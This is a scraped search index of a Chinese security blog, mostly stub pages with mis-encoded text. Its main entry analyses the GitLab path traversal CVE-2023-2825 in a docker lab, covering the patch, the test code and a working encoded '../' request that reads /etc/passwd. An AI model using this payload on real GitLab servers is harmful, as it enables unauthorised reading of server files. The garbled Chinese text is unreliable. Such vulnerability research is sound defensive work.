[{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/windows-clfs-eop/","title":"Windows CLFS EoP","tags":[],"description":"","content":"Chapter X Some Chapter title åºå· æ¼æ´å ç¼–å· ç±»å‹ 2 windows CLFS æƒé™æå‡æ¼æ´ CVE-2023-28252 æƒé™æå‡ 1 windows CLFS æƒé™æå‡æ¼æ´ CVE-2022-37969 æƒé™æå‡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/","title":"Windows","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/ntlm/","title":"Ntlm åè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/","title":"åè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/web/","title":"Web","tags":[],"description":"","content":"web Webå®‰å…¨ç ”ç©¶ç›¸å…³\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/","title":"ä»£ç å®¡è®¡","tags":[],"description":"","content":"ä»£ç å®¡è®¡ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/kerberos-in-windows/","title":"Windowsä¸­çš„kerberosåè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/protocol/kerberos/","title":"Kerberos åè®®","tags":[],"description":"","content":"kerberosåè®®ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/dll-inject/","title":"Dllæ³¨å…¥","tags":[],"description":"","content":"Dllæ³¨å…¥ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/socks/","title":"Socksåè®®","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/","title":"éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/","title":"åº”ç”¨å±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/transport-layer/","title":"ä¼ è¾“å±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/network-layer/","title":"ç½‘ç»œå±‚éš§é“","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/","title":"å®‰å…¨ç ”ç©¶","tags":[],"description":"","content":"å®‰å…¨ç ”ç©¶ "},{"uri":"https://www.ch35tnut.site/zh-cn/research/windows/pe/","title":"Pe","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/","title":"æ¼æ´åˆ†æ","tags":[],"description":"","content":"æ¼æ´åˆ†æ ä¸€äº›æ¼æ´åˆ†ææ–‡ç« ã€‚\nåºå· æ¼æ´å ç¼–å· ç±»å‹ çŠ¶æ€ â˜ 15 â˜‘ 14 Windows CLFS æƒé™æå‡æ¼æ´ç³»åˆ— æƒé™æå‡ âœ— 13 gitlab ç›®å½•ç©¿è¶Šæ¼æ´ CVE-2023-2825 ä¿¡æ¯æ³„éœ² âœ“ 12 zero logonåˆ†æ CVE-2020-1472 æƒé™æå‡ âœ— 11 windows http.sys æƒé™æå‡æ¼æ´ CVE-2023-23410 æƒé™æå‡ âœ“ 10 TerraMaster TOSä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-24990 ä»£ç æ‰§è¡Œ âœ— 9 PgAdmin ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-4223 ä»£ç æ‰§è¡Œ âœ— 8 sudoæƒé™æå‡æ¼æ´ CVE-2021-3156 æƒé™æå‡ âœ— 7 Minioä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2023-28432 ä¿¡æ¯æ³„éœ² âœ— 6 Strapi ä»£ç æ‰§è¡Œæ¼æ´é“¾ ä»£ç æ‰§è¡Œ âœ— 5 Outlook æƒé™æå‡æ¼æ´ CVE-2023-23397 æƒé™æå‡ âœ— 4 OWASSRF å’Œ TabShellåˆ†æ CVE-2022-41080 CVE-2022-41076 ä»£ç æ‰§è¡Œ âœ— 3 proxy not shell æ¼æ´é“¾ CVE-2022-41040 CVE-2022-41082 ä»£ç æ‰§è¡Œ âœ— 2 proxy shell æ¼æ´é“¾ CVE-2021-34473 CVE-2021-34523 CVE-2021-31207 ä»£ç æ‰§è¡Œ âœ— 1 win32k æƒé™æå‡æ¼æ´ CVE-2021-40449 æƒé™æå‡ âœ“ "},{"uri":"https://www.ch35tnut.site/zh-cn/","title":"é¦–é¡µ","tags":[],"description":"","content":"å­¦ä¹ è®°å½• è®°å½•ä¸€äº›å¹³æ—¶å­¦ä¹ å’Œç”Ÿæ´»çš„æ—¥å¸¸ã€‚\n09-13è‡³09-16\r| 263 days ago\rè¿™å‘¨å†å†™ä¸€ä¸ªåŸºäºrustçš„loaderï¼Œå†™äº†ä¸€åŠå‘ç°åŠ è½½çš„dllå¤ªå¤šäº†ï¼Œå†æƒ³åŠæ³•ç”¨åŠ¨æ€åŠ è½½çš„æ–¹å¼åŠ è½½dllï¼Œæ„Ÿè§‰ç”¨ruståšæœ‰ç‚¹éš¾ã€‚\nç”¨rustçš„å†…è”æ±‡ç¼–è·å–åˆ°äº†kernel32.dllå’Œntdll.dllçš„åŸºå€ï¼Œè¿˜è¦ç»§ç»­å®Œå–„ã€‚\n2023\r09-10è‡³09-12\r2 days | 266 days ago\rä¸­ç§‹èŠ‚ï¼Œåœ¨å®¶æ‘¸äº†å‡ å¤©ğŸŸï¼Œå•¥éƒ½æ²¡å¹²\n2023\r09-05è‡³09-09\r4 days | 271 days ago\rè¿™å‘¨ç¼–è¯‘äº†wireshark 1.8.5ï¼Œé€šè¿‡diff1.8.5å’Œ1.8.6çš„æºç æ‰¾å‡º1.8.5é‡Œé¢çš„æ¼æ´ï¼Œè§\rwireshark 1.8.5ä»£ç å®¡è®¡\n2023\r09-03è‡³09-04\r1 day | 273 days ago\rè¿™ä¸¤å¤©ï¼Œç»™hugoä¸»é¢˜å¢åŠ äº†timelineçš„shortcodeï¼Œè§\rå¢åŠ timelineåŠŸèƒ½\n2023\r08-29è‡³09-02\r4 days | 278 days ago\rå‘¨å†…çœ‹äº†ä¸€ä¸ªå‡ ç™¾è¡Œçš„ä»£ç ï¼Œè§\rnews_serverå®¡è®¡\n2023\ré»‘å®¢ç²¾ç¥ï¼šOpen, Share, Free\n"},{"uri":"https://www.ch35tnut.site/zh-cn/dailylife/","title":"ç”Ÿæ´»éšç¬”","tags":[],"description":"","content":"Chapter X Some Chapter title Lorem Ipsum.\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/","title":"æ‚é¡¹","tags":[],"description":"","content":"æ‚é¡¹ æš‚æ— \n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/","title":"å…¶ä»–","tags":[],"description":"","content":"å…¶ä»– "},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/","title":"CVE-2023-2825 Gitlab è·¯å¾„ç©¿è¶Šæ¼æ´åˆ†æ","tags":[],"description":"","content":"åŸºæœ¬ä¿¡æ¯ åœ¨GitLab ä¸­ï¼Œå½“ä¸€ä¸ªé™„ä»¶å­˜åœ¨äºä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œå¹¶ä¸”è¯¥é¡¹ç›®åœ¨åµŒå¥—äº†è‡³å°‘äº”å±‚çš„ç»„å†…ï¼Œæ”»å‡»è€…æ‰å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ã€‚\nå½±å“ç‰ˆæœ¬ GitLab 16.0.0\nç¯å¢ƒæ­å»º ç”¨dockerèµ·ç¯å¢ƒ\ndocker pull gitlab/gitlab-ce:16.0.0-ce.0 docker run -d -p 443:443 -p 80:80 -p 222:22 --name gitlab --restart always -v /home/gitlab/config:/etc/gitlab -v /home/gitlab/logs:/var/log/gitlab -v /home/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:16.0.0-ce.0 æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æ™®é€šçš„ç›®å½•ç©¿è¶Šï¼Œå…ˆdiffçœ‹æ€ä¹ˆä¿®çš„ï¼Œæ³¨æ„åˆ°16.0.1æ–°å¢äº†spec\\support\\shared_examples\\requests\\uploads_actions_shared_examples.rb æ–‡ä»¶ã€‚\næ ¹æ®è¯¥æ–‡ä»¶å†…å®¹åˆ¤æ–­åº”è¯¥æ˜¯è¿™ä¸ªæ¼æ´çš„å•å…ƒæµ‹è¯•æ–‡ä»¶ï¼Œæ²¡å­¦è¿‡rubyï¼Œå…ˆæŠŠè¿™æ®µä»£ç æ‰”ç»™ChatGPTçœ‹çœ‹\n# frozen_string_literal: true RSpec.shared_examples \u0026#39;uploads actions\u0026#39; do describe \u0026#34;GET #show\u0026#34; do context \u0026#39;with file traversal in filename parameter\u0026#39; do # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET let(:filename) { \u0026#34;../../../../../../../../../Gemfile.lock\u0026#34; } let(:escaped_filename) { CGI.escape filename } it \u0026#39;responds with status 400\u0026#39; do # Check files do indeed exists upload_absolute_path = Pathname(upload.absolute_path) expect(upload_absolute_path).to be_exist attacked_file_path = upload_absolute_path.dirname.join(filename) expect(attacked_file_path).to be_exist # Need to escape, otherwise we get `ActionController::UrlGenerationError Exception: No route matches` get show_path.sub(File.basename(upload.path), escaped_filename) expect(response).to have_gitlab_http_status(:bad_request) end end end end ChatGPTå›ç­”ï¼š\nè¿™æ®µRubyä»£ç å®šä¹‰äº†ä¸€ä¸ªRSpecå…±äº«ç¤ºä¾‹ï¼Œåä¸ºâ€œuploads actionsâ€ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ã€‚è¿™ä¸ªæµ‹è¯•ç”¨ä¾‹æµ‹è¯•äº†åœ¨æ–‡ä»¶åå‚æ•°ä¸­å‘ç”Ÿæ–‡ä»¶éå†æ”»å‡»æ—¶æœåŠ¡å™¨çš„å“åº”è¡Œä¸ºã€‚ åœ¨æµ‹è¯•ç”¨ä¾‹ä¸­ï¼Œé¦–å…ˆå®šä¹‰äº†ä¸¤ä¸ªå˜é‡ï¼šfilenameå’Œescaped_filenameã€‚filenameå˜é‡æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒä»£è¡¨å°†è¢«æ”»å‡»çš„æ–‡ä»¶åã€‚escaped_filenameå˜é‡æ˜¯å¯¹filenameè¿›è¡ŒURLç¼–ç åçš„ç»“æœï¼Œè¿™æ˜¯ä¸ºäº†é¿å…è¯·æ±‚URLä¸­ä½¿ç”¨ä¸å®‰å…¨çš„å­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´æ„å¤–çš„ç»“æœã€‚ ç„¶åï¼Œè¯¥æµ‹è¯•ç”¨ä¾‹æ£€æŸ¥ä¸Šä¼ çš„æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œä¹‹åæ„é€ ä¸€ä¸ªæ¶æ„URLè¯·æ±‚æ¥æ‰§è¡Œæ–‡ä»¶éå†æ”»å‡»ï¼Œè¯·æ±‚ä¸€ä¸ªéæ³•æ–‡ä»¶ã€‚å…·ä½“è€Œè¨€ï¼Œå®ƒä½¿ç”¨Pathnameç±»æ¥è·å–ä¸Šä¼ æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼Œç„¶åä½¿ç”¨File.basenameå’ŒString#subæ–¹æ³•æ¥æ„é€ æ¶æ„URLè¯·æ±‚ã€‚æœ€åï¼Œä½¿ç”¨RSpecçš„expectè¯­å¥æ¥æ£€æŸ¥æœåŠ¡å™¨çš„å“åº”çŠ¶æ€ç æ˜¯å¦ä¸º400ï¼ˆbad_requestï¼‰ã€‚ æ€»ä¹‹ï¼Œè¿™ä¸ªRSpecå…±äº«ç¤ºä¾‹æµ‹è¯•äº†æœåŠ¡å™¨æ˜¯å¦èƒ½å¤Ÿé˜²æ­¢æ–‡ä»¶éå†æ”»å‡»ï¼Œå¹¶æ­£ç¡®åœ°å¤„ç†æ¶æ„è¯·æ±‚ã€‚ æ ¹æ®æœ‰é™çš„çŸ¥è¯†ç»“åˆChatGPTå›ç­”ï¼Œå¯ä»¥çŸ¥é“è¿™æ®µä»£ç é¦–å…ˆå®šä¹‰äº†ç›®å½•ç©¿è¶Šçš„payloadï¼š../../../../../../../../../Gemfile.lock è€Œåå°†å…¶è¿›è¡Œurlç¼–ç å¹¶èµ‹å€¼ç»™escaped_filenameã€‚\nä¹‹åå°†ä¸Šä¼ ç›®å½•çš„è·¯å¾„å’Œè¿™ä¸ªpayloadæ‹¼æ¥å¹¶åˆ¤æ–­è¿™ä¸ªè·¯å¾„æ˜¯å¦å­˜åœ¨ã€‚ä¹‹åé€šè¿‡String.subå‡½æ•°å°†ä¸Šä¼ è·¯å¾„çš„æ–‡ä»¶åæ›¿æ¢æˆäº†escaped_filenameï¼Œå¹¶ç”¨RSpec æ¡†æ¶çš„getå‡½æ•°å‘èµ·è¯·æ±‚ã€‚\nç»“åˆè¯¥å•å…ƒæµ‹è¯•çš„æ³¨é‡Šï¼Œå¯ä»¥çŸ¥é“ï¼Œå¤§æ¦‚payloadå¦‚ä¸‹\n/url/to/upload/%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2FGemfile%2Elock # Uploads in tests are stored in directories like: # tmp/tests/public/uploads/@hashed/AB/CD/ABCD/SECRET åœ¨é€šè¿‡å®˜æ–¹æ–‡æ¡£çŸ¥é“å¦‚ä½•é€šè¿‡APIä¸Šä¼ é™„ä»¶\ncurl --request POST --header \u0026#34;PRIVATE-TOKEN: \u0026lt;your_access_token\u0026gt;\u0026#34; \\ --form \u0026#34;file=@dk.png\u0026#34; \u0026#34;https://gitlab.example.com/api/v4/projects/5/uploads\u0026#34; https://github.com/gitlabhq/gitlabhq/blob/master/doc/api/projects.md#upload-a-file\nè¿™é‡Œå…ˆç”¨Administratorä¸Šä¼ ä¸€ä¸ªé™„ä»¶çœ‹çœ‹ï¼ˆå·²æå‰å»ºå¥½ç›¸åº”çš„ç»„å’Œé¡¹ç›®ï¼‰\n$ curl --request POST --header \u0026#34;PRIVATE-TOKEN: glpat-Py3rEGA_SPngPn-2LzsR\u0026#34; --form \u0026#34;file=@3.txt\u0026#34; \u0026#34;http://192.168.59.197/api/v4/projects/g1%2Fg2%2Fg3%2Fg4%2Fg5%2Fg6%2Fg7%2Fg8%2Fg9%2Fp4/uploads\u0026#34; {\u0026#34;alt\u0026#34;:\u0026#34;3.txt\u0026#34;,\u0026#34;url\u0026#34;:\u0026#34;/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt\u0026#34;,\u0026#34;full_pat h\u0026#34;:\u0026#34;/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/3.tx t\u0026#34;,\u0026#34;markdown\u0026#34;:\u0026#34;[3.txt](/uploads/3fc9a510049cd6bbee4507d21164020f/3.txt)\u0026#34;} å¯ä»¥çœ‹åˆ°å·²ç»è¿”å›äº†ä¸€ä¸ªurlï¼Œä¸éš¾çœ‹å‡ºå’Œå•å…ƒæµ‹è¯•é‡Œé¢çš„æ³¨é‡Šçš„è·¯å¾„é•¿å¾—å¾ˆåƒï¼Œè¿™é‡Œç”¨è‡ªå·±çš„payloadæ›¿æ¢3.txt\n$ curl http://192.168.59.197/g1/g2/g3/g4/g5/g6/g7/g8/g9/p4/uploads/3fc9a510049cd6bbee4507d21164020f/%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2F%2e%2e%2Fetc%2fpasswd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologi n nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin sshd:x:101:65534::/run/sshd:/usr/sbin/nologin git:x:998:998::/var/opt/gitlab:/bin/sh gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh registry:x:993:993::/var/opt/gitlab/registry:/bin/sh gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh åˆ†æ\nåˆ°ç°åœ¨æœ‰ä¸¤ä¸ªé—®é¢˜\nä¸ºä»€ä¹ˆè¦æ±‚payloadéœ€è¦ç»è¿‡urlç¼–ç  ä¸ºä»€ä¹ˆè¦12ä¸ªç©¿è¶Šç¬¦æ‰èƒ½åˆ°æ ¹ç›®å½• åœ¨å“ªä¸ªä»£ç è§¦å‘çš„æ¼æ´ é¦–å…ˆæ˜¯ç¬¬ä¸€ä¸ªé—®é¢˜ï¼ŒGitLabæ¶æ„ä¸ºnginx â†”Workhorseâ†”pumaï¼Œèµ·åˆä»¥ä¸ºå°†ç›®å½•ç©¿è¶Šè¿›è¡Œurlç¼–ç æ˜¯ç»•è¿‡nginxè§£æï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå½“è®¿é—®/1/2/3/4/5/6/../../../index.phpæ—¶nginxå®é™…ä¼šè®¿é—®/1/2/3/index.phpï¼Œå³ä¼šè¿›è¡Œæ‹¼æ¥ç„¶åè®¿é—®ï¼Œæ‰€ä»¥ä¸€å¼€å§‹åˆ¤æ–­çš„æ˜¯å°†payloadè¿›è¡Œurlç¼–ç ç»•è¿‡è¿™ä¸ªè¿‡ç¨‹ï¼Œè€Œåå’Œå…¶ä»–å¸ˆå‚…è®¨è®ºæ‰å‘ç°ï¼Œè™½ç„¶å°†payloadè¿›è¡Œç¼–ç ä½†nginxä¼šå°†urlé‡Œé¢urlç¼–ç çš„éƒ¨åˆ†è¿›è¡Œè§£ç ç„¶åæ‹¼æ¥ï¼Œæ‰€ä»¥urlç¼–ç ä¸æ˜¯ä¸ºäº†ç»•è¿‡nginxè§£æã€‚åœ¨å‰é¢ä½¿ç”¨apiä¸Šä¼ æ–‡ä»¶æ—¶ï¼Œæ–‡æ¡£ç‰¹åˆ«å¼ºè°ƒäº†ä¸Šä¼ ç›®æ ‡è·¯å¾„éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œè¿™é‡Œæ¨æµ‹åº”è¯¥æ˜¯GitLabå†…ä¼šè¿›è¡Œurlè§£ç åœ¨è¿›è¡Œå¤„ç†ã€‚\nç¬¬äºŒä¸ªé—®é¢˜ä¸ºä»€ä¹ˆéœ€è¦12ä¸ªç©¿è¶Šç¬¦ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ–‡ä»¶å®é™…ä¸Šä¼ åœ¨/var/opt/gitlab/gitlab-rails/uploads/@hashed ç›®å½•ä¸‹ï¼Œä½†åœ¨ä»£ç ä¸­ä½¿ç”¨çš„æ˜¯/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/ å…¶ä¸­uploadsè½¯è¿æ¥åˆ°äº†/var/opt/gitlab/gitlab-rails/uploadsç›®å½•ï¼Œåœ¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åï¼Œæ–‡ä»¶è·¯å¾„ä¸º/opt/gitlab/embedded/service/gitlab-rails/public/uploads/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a/34c2b7fc66dcfbfe0b65513260ad0510/3.txt ä¸éš¾çœ‹å‡ºå…±æœ‰12å±‚ç›®å½•æ‰€ä»¥éœ€è¦12ä¸ªç©¿è¶Šç¬¦ï¼Œåœ¨è§¦å‘æ¼æ´æ—¶urlä¸º/path/to/group/project/uploads/@hashedï¼Œç»“åˆç»•è¿‡nginxè§£æï¼Œæ‰€ä»¥è‡³å°‘éœ€è¦9ä¸ªç»„æ‰èƒ½æœ‰è¶³å¤Ÿçš„åµŒå¥—å±‚æ•°ç»•è¿‡nginxçš„urlè§£æã€‚\nç¬¬ä¸‰ä¸ªé—®é¢˜ï¼Œå›åˆ°è¡¥ä¸å¯¹æ¯”ï¼Œè¡¥ä¸ä¸»è¦åœ¨ä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶æ·»åŠ äº†é˜²æŠ¤ç›®å½•ç©¿è¶Šçš„ä»£ç ï¼Œåœ¨showæ–¹æ³•å¤„å¯¹filenameè¿›è¡Œurlè§£ç è€Œåè°ƒç”¨ Gitlab::Utils.check_path_traversal!(params[:filename]) æ£€æŸ¥urlè§£ç åçš„å‚æ•°æ˜¯å¦å­˜åœ¨ç›®å½•ç©¿è¶Šã€‚\napp\\uploaders\\object_storage.rb def retrieve_from_store!(identifier) Gitlab::Utils.check_path_traversal!(identifier) # We need to force assign the value of @filename so that we will still # get the original_filename in cases wherein the file points to a random generated # path format. This happens for direct uploaded files to final location. # # If we don\u0026#39;t set @filename value here, the result of uploader.filename (see ObjectStorage#filename) will result # to the value of uploader.file.filename which will then contain the random generated path. # The `identifier` variable contains the value of the `file` column which is the original_filename. # # In cases wherein we are not uploading to final location, it is still fine to set the # @filename with the `identifier` value because it still contains the original filename from the `file` column, # which is what we want in either case. @filename = identifier # rubocop: disable Gitlab/ModuleWithInstanceVariables super end private app\\controllers\\concerns\\uploads_actions.rb def show Gitlab::Utils.check_path_traversal!(params[:filename]) return render_404 unless uploader\u0026amp;.exists? ttl, directives = *cache_settings ttl ||= 0 directives ||= { private: true, must_revalidate: true } expires_in ttl, directives file_uploader = [uploader, *uploader.versions.values].find do |version| version.filename == params[:filename] end return render_404 unless file_uploader workhorse_set_content_type! send_upload(file_uploader, attachment: file_uploader.filename, disposition: content_disposition) end å†æ¥çœ‹Gitlab::Utils.check_path_traversalå‡½æ•°ï¼Œå…¶å®šä¹‰åœ¨lib\\gitlab\\utils.rb\ndef check_path_traversal!(path) return unless path path = path.to_s if path.is_a?(Gitlab::HashedPath) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; unless path.is_a?(String) path = decode_path(path) path_regex = %r{(\\A(\\.{1,2})\\z|\\A\\.\\.[/\\\\]|[/\\\\]\\.\\.\\z|[/\\\\]\\.\\.[/\\\\]|\\n)} if path.match?(path_regex) logger.warn(message: \u0026#34;Potential path traversal attempt detected\u0026#34;, path: \u0026#34;#{path}\u0026#34;) raise PathTraversalAttackError, \u0026#39;Invalid path\u0026#39; end path end è¿™ä¸ªå‡½æ•°æ¥æ”¶ä¸€ä¸ªè·¯å¾„ï¼Œè€Œåç”¨æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…åˆ°äº†åˆ™æŠ›å‡ºPathTraversalAttackError é”™è¯¯ï¼ŒæŠŠè¿™æ®µæ­£åˆ™è¡¨è¾¾å¼ç»™ChatGPTï¼Œç»™å‡ºäº†å¦‚ä¸‹è§£é‡Šï¼Œæ‰€ä»¥ä»£ç è°ƒç”¨è¿™ä¸ªå‡½æ•°å¯ä»¥æ£€æŸ¥æ˜¯å¦å­˜åœ¨æ¶æ„çš„ç›®å½•ç©¿è¶Šã€‚\nè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯ç”¨æ¥åŒ¹é…æ–‡ä»¶è·¯å¾„å­—ç¬¦ä¸²ä¸­çš„ç›¸å¯¹è·¯å¾„ï¼ˆå¦‚\u0026#34;./\u0026#34;ã€\u0026#34;../\u0026#34;ç­‰ï¼‰çš„ï¼Œå®ƒçš„å«ä¹‰ä¸å‰ä¸€ä¸ªé—®é¢˜ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼éå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯ä½¿ç”¨äº†ä¸åŒçš„è¯­æ³•æ¥è¡¨ç¤ºç›¸åŒçš„å«ä¹‰ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„å«ä¹‰å¦‚ä¸‹ï¼š json \\A åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ (.{1,2}) åŒ¹é…ä¸€ä¸ªæˆ–ä¸¤ä¸ªä»»æ„å­—ç¬¦ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸€ä¸ªåˆ†ç»„ \\z åŒ¹é…å­—ç¬¦ä¸²çš„ç»“å°¾ | æˆ– \\A..\\[/\\\\] åŒ¹é…ä»¥\u0026#34;../\u0026#34;å¼€å¤´çš„å­—ç¬¦ä¸² | æˆ– [/\\\\]..\\z åŒ¹é…ä»¥\u0026#34;/..\u0026#34;ç»“å°¾çš„å­—ç¬¦ä¸² | æˆ– [/\\\\]..\\[/\\\\] åŒ¹é…\u0026#34;/../\u0026#34;æˆ–\u0026#34;\\..\\\u0026#34;è¿™æ ·ä»¥\u0026#34;/\u0026#34;æˆ–\u0026#34;\\\u0026#34;å¼€å¤´ä¸”ä»¥\u0026#34;/\u0026#34;æˆ–\u0026#34;\\\u0026#34;ç»“å°¾çš„å­—ç¬¦ä¸² | æˆ– \\n åŒ¹é…æ¢è¡Œç¬¦ ) åˆ†ç»„ç»“æŸ å…¶ä¸­ï¼Œ\\Aã€\\zå’Œ\\nåˆ†åˆ«ä»£è¡¨å­—ç¬¦ä¸²çš„å¼€å¤´ã€ç»“å°¾å’Œæ¢è¡Œç¬¦ï¼Œ|è¡¨ç¤ºæˆ–çš„å…³ç³»ï¼Œ[/\\\\]ç”¨æ¥åŒ¹é…\u0026#34;\u0026#34;æˆ–\u0026#34;/\u0026#34;è¿™ä¸¤ç§ç›®å½•åˆ†éš”ç¬¦ï¼Œå› ä¸ºåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸­ï¼Œç›®å½•åˆ†éš”ç¬¦æ˜¯ä¸åŒçš„ã€‚ è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ä½œç”¨æ˜¯åŒ¹é…ä¸€ä¸ªç›¸å¯¹è·¯å¾„å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ä¸åˆæ³•çš„ç›¸å¯¹è·¯å¾„ï¼Œä¾‹å¦‚è·¯å¾„ä¸­åŒ…å«è¶…å‡ºæ ¹ç›®å½•çš„\u0026#34;../\u0026#34;æˆ–è€…\u0026#34;..\u0026#34;è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€…ä»¥\u0026#34;../\u0026#34;å¼€å¤´æˆ–ä»¥\u0026#34;/..\u0026#34;ç»“å°¾ã€‚å¦‚æœåŒ¹é…æˆåŠŸï¼Œè¯´æ˜è¯¥è·¯å¾„å­˜åœ¨ä¸åˆæ³•çš„ç›¸å¯¹è·¯å¾„ï¼Œéœ€è¦è¿›è¡Œå¤„ç†æˆ–æŠ¥é”™ã€‚ è¡¥ä¸è¿˜ä»¥ä¸‹è·¯å¾„æ–°å¢äº†æ–‡ä»¶ï¼Œä¸éš¾çœ‹å‡ºæ˜¯åœ¨å®šä¹‰äº†moduleå’Œuploadå¯¹è±¡ï¼Œè€Œåå®šä¹‰äº†ä¸€ä¸ªå­—ç¬¦ä¸²show_pathå¹¶æŠŠå®ƒä¼ ç»™äº†config/routes/uploads.rbæ‰§è¡Œã€‚\nspec\\requests\\uploads_controller_spec.rb # frozen_string_literal: true require \u0026#39;spec_helper\u0026#39; RSpec.describe UploadsController, feature_category: :shared do include WorkhorseHelpers it_behaves_like \u0026#39;uploads actions\u0026#39; do let_it_be(:model) { create(:personal_snippet, :public) } let_it_be(:upload) { create(:upload, :personal_snippet_upload, :with_file, model: model) } # See config/routes/uploads.rb let(:show_path) do \u0026#34;/uploads/-/system/#{model.model_name.singular}/#{model.to_param}/#{upload.secret}/#{File.basename(upload.path)}\u0026#34; end end end 